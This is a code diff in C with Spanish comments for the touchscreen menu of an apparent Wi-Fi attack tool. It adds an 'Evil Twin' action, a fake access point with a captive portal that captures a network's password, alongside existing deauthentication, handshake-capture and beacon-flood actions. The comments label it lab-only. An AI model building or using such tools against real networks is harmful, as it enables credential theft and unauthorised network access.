@@ -348,6 +348,67 @@ static void on_beacon_confirm(bool confirmed, void *user_data) {
     pthread_detach(tid);
 }
 
+/* ── Evil Twin (AP falso + portal cautivo que captura la clave). SOLO lab.
+ *    Operacion larga (hasta ET_SECONDS esperando que la victima ingrese la
+ *    clave en el portal). Mismo patron hilo + poll. ── */
+#define ET_SECONDS 180
+static volatile int g_et_running = 0;
+static volatile int g_et_done = 0;
+static int g_et_ok = 0;                 /* 1=capturo, 0=no, -1=error */
+static char g_et_ssid[64];
+static char g_et_bssid[24];
+static int g_et_channel = 6;
+static char g_et_password[128];
+static char g_et_detail[160];
+
+static void *eviltwin_thread_fn(void *arg) {
+    (void)arg;
+    g_et_password[0] = '\0';
+    g_et_detail[0] = '\0';
+    g_et_ok = wifi_client_evil_twin(g_et_ssid, g_et_bssid, g_et_channel, ET_SECONDS,
+                                    g_et_password, sizeof(g_et_password),
+                                    g_et_detail, sizeof(g_et_detail));
+    g_et_done = 1;
+    return NULL;
+}
+
+void ui_shell_poll_eviltwin(void) {
+    if (!g_et_done) return;
+    g_et_done = 0;
+    g_et_running = 0;
+    if (!g_wifi_status_label) return;
+    if (g_et_ok == 1) {
+        char buf[200];
+        snprintf(buf, sizeof(buf), "Clave capturada: %s", g_et_password);
+        lv_label_set_text(g_wifi_status_label, buf);
+        ui_shell_set_status(buf, UI_STATUS_ERROR);   /* rojo: red comprometida */
+    } else if (g_et_ok == 0) {
+        lv_label_set_text(g_wifi_status_label, "Evil Twin: sin captura");
+        ui_shell_set_status("Evil Twin: sin captura", UI_STATUS_OK);
+    } else {
+        lv_label_set_text(g_wifi_status_label, "Error en Evil Twin");
+        ui_shell_set_status("Error en Evil Twin (ver log)", UI_STATUS_ERROR);
+    }
+    set_wifi_buttons_disabled(0);
+}
+
+static void on_eviltwin_confirm(bool confirmed, void *user_data) {
+    (void)user_data;
+    if (!confirmed) return;
+    if (g_et_running) return;
+    snprintf(g_et_ssid, sizeof(g_et_ssid), "%s", g_wifi_target.ssid);
+    snprintf(g_et_bssid, sizeof(g_et_bssid), "%s", g_wifi_target.bssid);
+    g_et_channel = g_wifi_target.channel;
+    g_et_running = 1;
+    g_et_done = 0;
+    if (g_wifi_status_label) lv_label_set_text(g_wifi_status_label, "Evil Twin activo (portal ~3min)...");
+    ui_shell_set_status("Evil Twin: AP falso + portal activo...", UI_STATUS_WORKING);
+    set_wifi_buttons_disabled(1);
+    pthread_t tid;
+    pthread_create(&tid, NULL, eviltwin_thread_fn, NULL);
+    pthread_detach(tid);
+}
+
 /* ── Auditoria de handshake: corre una wordlist contra un .cap elegido.
  *    Mismo patron de hilo separado + poll desde el loop principal. ── */
 static volatile int g_audit_running = 0;
@@ -752,6 +813,20 @@ static void trigger_beacon(void) {
     confirm_dialog_show(g_main_screen, msg, on_beacon_confirm, NULL);
 }
 
+static void trigger_eviltwin(void) {
+    if (!g_wifi_target.has_target) {
+        if (g_wifi_status_label) lv_label_set_text(g_wifi_status_label, "Selecciona una red de la lista primero");
+        return;
+    }
+    if (g_et_running) return;
+
+    char msg[140];
+    snprintf(msg, sizeof(msg),
+             "Evil Twin de %s?\nDeauth + AP falso + portal (solo lab)",
+             g_wifi_target.ssid);
+    confirm_dialog_show(g_main_screen, msg, on_eviltwin_confirm, NULL);
+}
+
 /* ── Menu de Acciones (overlay) ──────────────────────────────────────────
  * Un solo boton "Acciones" abre esta lista con todo lo que se le puede hacer
  * al AP seleccionado. Escala sin llenar la pantalla de botones. Cada accion
@@ -772,6 +847,7 @@ static void act_deauth_cb(lv_event_t *e)    { if (lv_event_get_code(e)!=LV_EVENT
 static void act_handshake_cb(lv_event_t *e) { if (lv_event_get_code(e)!=LV_EVENT_PRESSED) return; close_actions_menu(); trigger_handshake(); }
 static void act_pmkid_cb(lv_event_t *e)     { if (lv_event_get_code(e)!=LV_EVENT_PRESSED) return; close_actions_menu(); trigger_pmkid(); }
 static void act_beacon_cb(lv_event_t *e)    { if (lv_event_get_code(e)!=LV_EVENT_PRESSED) return; close_actions_menu(); trigger_beacon(); }
+static void act_eviltwin_cb(lv_event_t *e)  { if (lv_event_get_code(e)!=LV_EVENT_PRESSED) return; close_actions_menu(); trigger_eviltwin(); }
 static void act_cancel_cb(lv_event_t *e)    { if (lv_event_get_code(e)!=LV_EVENT_PRESSED) return; close_actions_menu(); }
 
 /* Boton "Capturas" (fila superior, sin necesitar red seleccionada): abre la
@@ -830,12 +906,13 @@ static void wifi_actions_menu_show(void) {
     lv_obj_set_style_text_font(title, &lv_font_montserrat_10, 0);
     lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 2);
 
-    int y = 24;
-    make_action_btn(box, "Clientes",      0x33CCFF, y, act_clientes_cb);  y += 38;
-    make_action_btn(box, "Deauth red",    0xFF4444, y, act_deauth_cb);    y += 38;
-    make_action_btn(box, "Handshake",     0xFFCC33, y, act_handshake_cb); y += 38;
-    make_action_btn(box, "PMKID / EAPOL", 0xCC66FF, y, act_pmkid_cb);     y += 38;
-    make_action_btn(box, "Beacon flood",  0xFF9933, y, act_beacon_cb);    y += 38;
+    int y = 20;
+    make_action_btn(box, "Clientes",      0x33CCFF, y, act_clientes_cb);  y += 36;
+    make_action_btn(box, "Deauth red",    0xFF4444, y, act_deauth_cb);    y += 36;
+    make_action_btn(box, "Handshake",     0xFFCC33, y, act_handshake_cb); y += 36;
+    make_action_btn(box, "PMKID / EAPOL", 0xCC66FF, y, act_pmkid_cb);     y += 36;
+    make_action_btn(box, "Beacon flood",  0xFF9933, y, act_beacon_cb);    y += 36;
+    make_action_btn(box, "Evil Twin",     0xFF3366, y, act_eviltwin_cb);  y += 36;
     make_action_btn(box, "Cancelar",      0x33FF33, y, act_cancel_cb);
 }
 
